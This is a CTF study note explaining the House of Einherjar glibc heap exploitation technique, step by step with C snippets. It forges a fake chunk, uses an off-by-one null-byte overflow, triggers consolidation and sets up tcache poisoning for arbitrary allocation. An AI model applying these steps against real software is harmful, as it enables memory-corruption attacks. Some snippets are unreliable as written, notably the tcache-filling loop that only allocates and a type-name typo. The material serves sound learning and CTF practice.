---
tags:
  - pwn/heap
  - pwn/technique
---
# Description
The **House of Einherjar** is a technique that leverages an [[off-by-one]] overflow on a buffer on the heap (most commonly a *null byte* overflow) to eventually gain an arbitrary chunk allocation.

TL;DR:
1. We use the off-by-one overflow to forge a fake freed, doubly-linked chunk
2. Free an adjacent chunk to coalesce it with our fake chunk
3. Our coalesced chunk lands in the [[bins#unsorted bin|unsorted bin]] ([[LIBC]] leak)
4. Perform [[tcache poisoning]] with your new [[overlapping chunks]]
# Attack
## Requirements
- Heap leak %% #pwn/heap-leak %%
- [[off-by-one]] overflow
## Result
- [[overlapping chunks]] / [[use after free|UAF]]
- [[tcache poisoning]]
## Process
### Parameters/Constraints
- Chunk `a` size: `sz_a`, can be any
- Chunk `b` size (desired tcache poisoning size): `sz_b`, must be tcache sized and have a least significant nibble of `0x8` (to enable the off-by-one overflow)
- Chunk `c` size: `sz_c`, must be greater than <abbr title="0x58">fastbin_max</abbr> so it will go to [[bins#unsorted bin|unsorted bin]]
	- If the off-by-one overflow is a *null byte* overflow, it must be at least 0x100, and it is most convenient if it least significant byte is 0x00 (so the overflow only changes the flags, and not chunk `c`'s size).
- Target pointer for allocation, `target`
### Steps
This analysis will assume that we have a *null byte* overflow and:
- `sz_a = 0x38`
- `sz_b = 0x28`
- `sz_c = 0xf8`
1. Allocate chunk `a`
   ```c
	inptr_t a = malloc(0x38); // real size of 0x40
	```
2. Create the fake chunk in the data section of chunk `a` (i.e., fake chunk's header will be right below chunk `a`).
   ```c
	a[0] = 0; // prev_size, doesn't matter
	a[1] = 0x40 + 0x30 - 0x10; // size is the combined *real* sizes of chunks a and b, minus 0x10 to account for chunk a's header
	a[2] = a; // fd
	a[3] = a; // bk, 
	```
	Note that we need `a->fd->bk == a` and `a->bk->fd == a`, thus `a->fd = a->bk = a` works!
3. Allocate chunk `b`. This will be the overlapping chunk with our fake chunk.
   ```c
	inptr_t b = malloc(0x28); // real size of 0x30
	```
4. Allocate chunk `c`.
   ```c
	inptr_t c = malloc(0xf8); // real size of 0x100
	```
	The heap structure now looks like this:
	```
	a:      0x0      0x41
	fake:   0x0      0x60
			&a       &a
			0x0      0x0
	b:      0x0      0x31
	        0x0      0x0
	        0x0      0x0
	c:      0x0      0x101
			...      ...
	```
5. Use off-by-one overflow on chunk `b` to overflow into the header of chunk `c`, resulting in chunk `c`'s `PREV_INUSE` flag being set to `0`.
   ```c
	memset(b, 0, 0x28 + 1);
	```
	That is,
	```
	c:      0x0      0x100
			...      ...
	```
6. Write a fake `prev_size` for our fake chunk right above chunk `c`. This will pass the "corrupted size vs. prev_size" error when attempting to consolidate
   ```c
	b[4] = 0x60
	```
	i.e.,
	```
	b:      0x0      0x31
			0x0      0x0
			0x0      0x0
	c:		0x60     0x100
			...      ...
	```
7. Fill [[bins#tcache|tcache]] for `sz_c` so chunk `c`, when freed, will go to unsorted bin not tcache (alternatively, this may be done before step 1, just makes debugging a bit more difficult that way)
   ```c
	for (int i = 0; i < 7; i++) {
		malloc(0xf8);
	}
	
	malloc(0x18); // malloc once more to ensure no coalescing with top chunk
	
	for (int i = 0; i < 7; i++) {
		malloc(0xf8);
	}
	```
8. Free chunk `c`, triggering consolidation with the fake chunk since chunk `c`'s `PREV_INUSE` flag is `0`, causing `free()` to think the previous chunk can be consolidated.
   ```c
	free(c);
	```
9. Now malloc some chunk of size greater than `sz_a = 0x38`:
   ```c
	d = malloc(0x70);
	```
   and we have overlapping chunks! The chunk `d` will take a portion of the unsorted bin chunk formed by the consolidation of chunk `c` with our fake chunk. This chunk thus overlaps with chunk `b`. From here, exploits vary depending on program constraints. The general idea is to achieve [[tcache poisoning]], e.g.
	1. Allocating and freeing another chunk of `sz_b = 0x28` into the tcache bin for (real) size 0x30. This is necessary so that we can eventually have the number of chunks in this tcache bin be set to 2, enabling us to allocate twice in a row later. See \[2\] for more details.
	2. Freeing chunk `b` into tcache.
	3. Writing into chunk `d` to corrupt chunk `b`'s next pointer for tcache poisoning.
	4. Allocate twice to get an arbitrary chunk allocation!
# Examples
- smiley CTF 2025 / pwn / limit
# References
1. [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_einherjar.c) 
2. https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f